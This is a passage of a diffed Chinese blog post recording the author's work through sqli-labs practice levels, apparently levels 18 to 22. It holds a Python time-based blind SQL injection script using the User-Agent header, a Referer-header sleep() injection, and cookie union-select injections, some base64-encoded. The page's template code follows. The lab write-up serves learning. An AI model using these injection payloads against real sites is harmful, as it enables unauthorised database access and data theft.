+		<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):
+			<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span>
+		<span class="hljs-keyword">if</span>((<span class="hljs-built_in">num</span> == <span class="hljs-number">74</span>) <span class="hljs-keyword">or</span> (<span class="hljs-built_in">num</span> == <span class="hljs-number">87</span>)):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">4</span>):
+				payload = txt1+str(i)+txt3+str(j)+txt4
+				headers = &#123;'User-Agent': payload&#125;
+				time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+				time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-built_in">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">3</span>):
+				payload = txt1+str(i)+txt3+str(j)+txt4
+				headers = &#123;'User-Agent': payload&#125;
+				time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+				time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-built_in">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+	<span class="hljs-keyword">if</span>(num2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num3 == <span class="hljs-number">1</span>):
+		<span class="hljs-built_in">num</span> =<span class="hljs-number">48</span>
+		<span class="hljs-built_in">num</span> += <span class="hljs-number">5</span>
+		payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4
+		time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		req = requests.<span class="hljs-built_in">get</span>(url = url)
+		time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+		<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">5</span>):
+				url = txt1+str(i)+txt3+str(j)+txt4
+				headers = &#123;'User-Agent': payload&#125;
+				time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+				time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-built_in">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span>
+		<span class="hljs-keyword">else</span>:
+			<span class="hljs-built_in">num</span> -= <span class="hljs-number">5</span>
+			<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">5</span>):
+				payload = txt1+str(i)+txt3+str(j)+txt4
+				headers = &#123;'User-Agent': payload&#125;
+				time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)
+				time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()
+				<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):
+					code += chr(j)
+					<span class="hljs-built_in">print</span> code
+					num1 = <span class="hljs-number">0</span>
+					num2 = <span class="hljs-number">0</span>
+					num3 = <span class="hljs-number">0</span></code></pre></p>
+<p><img src="/img/2018-08-03/14.png" srcset="/img/static/loading.gif" alt="14"></p>
+<h5 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h5><p>跟第十八关一样，referer注入，也是insert语句<br>修改请求头<br><pre><code class="hljs undefined">Referer: http://localhost/sqli-labs/Less-19/' or if(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0</span>)) <span class="hljs-keyword">or</span> <span class="hljs-string">'</span></code></pre></p>
+<p><img src="/img/2018-08-03/15.png" srcset="/img/static/loading.gif" alt="15"><br>5秒后页面返回正常，脚本参考上面的</p>
+<h5 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h5><p>cookie注入，这一关要先登录，登陆后有cookie才可以注入<br>测试单引号，在cookie后面加一个单引号<br><img src="/img/2018-08-03/17.png" srcset="/img/static/loading.gif" alt="17"><br>用<code>order by</code>测试有多少列<br><pre><code class="hljs undefined">Cookie: <span class="hljs-attr">uname=</span>admin' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span></code></pre></p>
+<p><img src="/img/2018-08-03/18.png" srcset="/img/static/loading.gif" alt="18"><br>查数据库<br><pre><code class="hljs undefined">Cookie: uname=admin' <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span></code></pre></p>
+<p><img src="/img/2018-08-03/19.png" srcset="/img/static/loading.gif" alt="19"><br>后面的一样了</p>
+<div style="text-align: center">————————-2018-08-10更新————————-<br></div>
+
+<h5 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h5><p>用<code>admin</code>，<code>admin</code>登陆后抓包看到cooie<br><pre><code class="hljs undefined">Cookie: <span class="hljs-attribute">uname</span>=YWRtaW4%3D</code></pre></p>
+<p>url解码后<code>YWRtaW4=</code>，用base64尝试解码得到<code>admin</code>，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，<br><pre><code class="hljs undefined"><span class="hljs-attribute">Cookie</span>: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw<span class="hljs-number">%3</span>D<span class="hljs-number">%3</span>D</code></pre></p>
+<p><img src="/img/2018-08-03/21.png" srcset="/img/static/loading.gif" alt="21"></p>
+<h5 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h5><p>和第二十一关一样，单引号变双引号<br><pre><code class="hljs undefined">YWRtaW<span class="hljs-number">4</span>iIHVuaW<span class="hljs-number">9</span>uIH<span class="hljs-symbol">NlbGVjdCAxLDIsZGF0</span>YWJhc<span class="hljs-number">2</span>UoKSBsaW<span class="hljs-number">1</span>pdCAxLDEj</code></pre></p>
+<p>第一部分</p>
+<p>完、</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/注入/">注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/盲注/">盲注</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/08/17/sqli-labs3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sqli-labs的学习记录三（23-30）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/07/26/proxmark3/">
+                        <span class="hidden-mobile">Proxmark3 Easy破解门禁卡学习过程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz",
+          app_key: "i3vUWkHRRkiiS7LuUpuIm1E5",
+          placeholder: "说些什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "sRx9dQVqzL65gdhuYexJtTPF",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+  <div class="statistics">
+    
+    
+    <i class="iconfont icon-users"></i>
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      <i class="iconfont icon-friends"></i>
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+    
+      
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-codeforces"></i>
+        全站共计:31.9k 字
+      </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer>
+  (function () {
+    // 查询存储的记录
+    function getRecord(Counter, target) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {target, time: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    }
+
+    // 发起自增请求
+    function increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    }
+
+    // 构建自增请求体
+    function buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "time": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    }
+
+    // 校验是否为有效的 UV
+    function validUV() {
+      var key = 'LeanCloud_UV_Flag';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    }
+
+    function addCount(Counter) {
+      var enableIncr = 'true' === 'true' && window.location.hostname !== 'localhost';
+      var getterArr = [];
+      var incrArr = [];
+
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#leancloud-site-pv-container');
+      if (pvCtn || enableIncr) {
+        var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+          incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-pv');
+          if (ele) {
+            ele.innerText = record.time + 1;
+            if (pvCtn) {
+              pvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#leancloud-site-uv-container');
+      if (uvCtn || enableIncr) {
+        var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+          var vuv = validUV();
+          vuv && incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-uv');
+          if (ele) {
+            ele.innerText = record.time + (vuv ? 1 : 0);
+            if (uvCtn) {
+              uvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 如果是文章，请求文章的浏览数，并自增
+      if ('true' === 'true') {
+        var viewCtn = document.querySelector('#leancloud-post-views-container');
+        if (viewCtn || enableIncr) {
+          var target = decodeURI('/2018/08/03/sqli-labs2/');
+          var viewGetter = getRecord(Counter, target).then((record) => {
+            incrArr.push(buildIncrement(record.objectId))
+            if (viewCtn) {
+              var ele = document.querySelector('#leancloud-post-views');
+              if (ele) {
+                ele.innerText = (record.time || 0) + 1;
+                viewCtn.style.display = 'inline';
+              }
+            }
+          });
+          getterArr.push(viewGetter);
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && increment(Counter, incrArr);
+        })
+      }
+    }
+
+    var app_id = '3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz'
+    var app_key = 'neatHwvRMvcDYnNxMBbGGFlP'
+    var server_url = 'https://3vytx5qf.lc-cn-n1-shared.com'
+
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': app_id,
+            'X-LC-Key': app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+
+      addCount(Counter);
+    }
+
+    var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(resp => resp.json())
+        .then(({api_server}) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    function typing(id, hitokoto){
+      var typed = new Typed('#' + id, {
+        strings: [
+          '  ',
+          hitokoto + "&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        loop: false,
+      });
+      typed.stop();
+      $(document).ready(function () {
+        $(".typed-cursor").addClass("h2");
+        typed.start();
+      });
+    };
+      
+  
+    typing("subtitle", "sqli-labs的学习记录二（9-22）")
+  
+  </script>
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
